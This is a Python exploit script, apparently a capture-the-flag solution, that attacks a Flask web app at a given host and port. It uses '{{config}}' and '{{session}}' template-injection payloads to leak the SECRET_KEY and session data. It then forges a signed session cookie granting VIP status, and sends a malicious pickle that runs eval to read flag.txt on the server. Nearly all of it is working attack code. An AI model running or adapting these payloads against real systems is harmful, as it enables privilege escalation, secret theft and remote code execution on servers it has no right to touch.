# python EXP.py [YOUR_HOST] [YOUR_PORT]   --->python check.py 127.0.0.1 5000
import ast
import builtins
import pickle
import re
import sys
from flask.sessions import SecureCookieSessionInterface
import requests
from bs4 import BeautifulSoup
import urllib
host = sys.argv[1]
port = int(sys.argv[2])

Uurl = 'http://' + host + ':' + str(port)
login_url = Uurl + '/auth/login'
post_login_url = Uurl + '/index'

session = requests.Session()
# session.proxies = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }

# session.verify = False
# 发送GET请求获取登录页面
response = session.get(login_url)
# print(response) # 检查请求是否成功
# print(session.cookies)
# 使用BeautifulSoup解析HTML以提取CSRF令牌
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token_tag = soup.find('input', {'name': 'csrf_token'})
csrf_token = csrf_token_tag['value']
print('Fetched CSRF token:', csrf_token)

# 准备登录表单数据
login_data = {
    'username': 'test', 
    'password': 'Test123.',
    'csrf_token': csrf_token
}
# print(login_data)

# 发送POST请求提交登录表单
login_response = session.post(login_url, data=login_data)
print('Logged in, session cookies:', session.cookies)
# # 使用BeautifulSoup解析登录响应内容以提取上传链接
# soup = BeautifulSoup(login_response.text, 'html.parser')
# upload_link_tag = soup.find('a', href=True, text='上传')
# upload_link = upload_link_tag['href']
# print('上传链接:', upload_link)

# 构造完整的上传文件页面URL
upload_page_url = Uurl + '/file/upload'

# 访问上传文件的页面
upload_page_response = session.get(upload_page_url)
# print(upload_page_response.text)

soup = BeautifulSoup(upload_page_response.text, 'html.parser')
csrf_token_tag = soup.find('input', {'name': 'csrf_token'})
csrf_token = csrf_token_tag['value'] if csrf_token_tag else None
print(f"Extracted CSRF Token for upload: {csrf_token}")
print("Uploading files: NJS.txt, Newjeans.txt")
with open('NJS.txt', 'w') as file:
    file.write('NEWJEANS IS EVERYWHERE.....HELPING YOU TO FIND FLAG...\n')

with open('Newjeans.txt', 'w') as file:
    file.write('NEWJEANS IS NEVER BLUE.....HELPING YOU TO FIND FLAG...\n')

file1_path = f'./NJS.txt'
file2_path = f'./Newjeans.txt'

files1 = {
    'file': open(file1_path, 'rb')
}
upload_data1 = {
    'csrf_token': csrf_token,
    'description': '{{config}}' 
}
files2 = {
    'file': open(file2_path, 'rb')
}
upload_data2 = {
    'csrf_token': csrf_token,
    'description': '{{session}}' 
}
upload_response1 = session.post(upload_page_url, data=upload_data1, files=files1)
# print('111111111111111111',upload_response1.text)
description1 = BeautifulSoup(upload_response1.text, 'html.parser').find_all('p', class_='file_description')[0].text
# print(description1)
pattern1 = r"SECRET_KEY': '([^']+)'"
secret_key = re.search(pattern1, description1).group(1)
# print(secret_key)

upload_response2 = session.post(upload_page_url, data=upload_data2, files=files2)
# print(upload_response2.text)
description2 = BeautifulSoup(upload_response2.text, 'html.parser').find_all('p', class_='file_description')[1].text
# print(description2)
pattern2 =  r"<SecureCookieSession (\{.*\})>"
# print(description2)
sessions = re.search(pattern2, description2).group(1)
# print(sessions)

sessions = ast.literal_eval(sessions)
sessions['is_vip']= 1


# Extracting and manipulating session data
print(f"Manipulated session data: {sessions}")
# Creating and serializing session cookie
print("Created and serialized session cookie.")

class App(object):  
    def __init__(self):
        self.secret_key = secret_key
app = App()  

si = SecureCookieSessionInterface()  #创建一个 SecureCookieSessionInterface 实例
serializer = si.get_signing_serializer(app)  # 签名序列化器
sessions = serializer.dumps(sessions)  #使用签名序列化器生成一个包含 {'is_admin': True} 的会话数据，并将其序列化为一个字符串（伪造的 session cookie）。
# print(sessions)

# 设定伪造的 session cookie
session.cookies.set('session', sessions, domain='127.0.0.1')
# print(session.cookies)

class EvilPickle:
    def __reduce__(self):
        # 当反序列化时，这个函数会被调用
        # 它返回一个元组，其中包含一个可调用的对象和一个参数列表
        # 在这个例子中，我们返回eval函数和它应该执行的字符串
        return (builtins.eval, ("open('./flag.txt', 'r').read()",))

# 序列化EvilPickle实例
pickle_string = pickle.dumps(EvilPickle())
# print(pickle_string)
p = urllib.parse.quote(pickle_string)
# print("============")
# print(p)

form_page_url = Uurl + '/file/submit_feedback'
view_fb_url = Uurl + '/file/view_feedback'

form_data = {
    'csrf_token': csrf_token,
    'message': p 
}

# Sending POST request to submit form
print("Sending POST request to submit form.")
# 发送POST请求提交表单
response = session.post(form_page_url, data=form_data)
# print('===========================')
# print(response.text)

view_data = {
        'csrf_token':csrf_token
    }
flag_response = session.post(view_fb_url,view_data)
# print(flag_response.text)
flag = BeautifulSoup(flag_response.text, 'html.parser').find_all('p', class_='view-feedback')

# 定义正则表达式模式
pattern3 = r'flag\{[0-9a-zA-Z_]+\}'
flag = str(flag)
# print(flag)
# 使用 re.findall() 提取匹配的内容
flag = re.findall(pattern3, flag)[0]

# Extracting flag from response
print(f"Extracted flag: {flag}")


# 关闭会话
session.close()

# Closing session
print("Closing session.")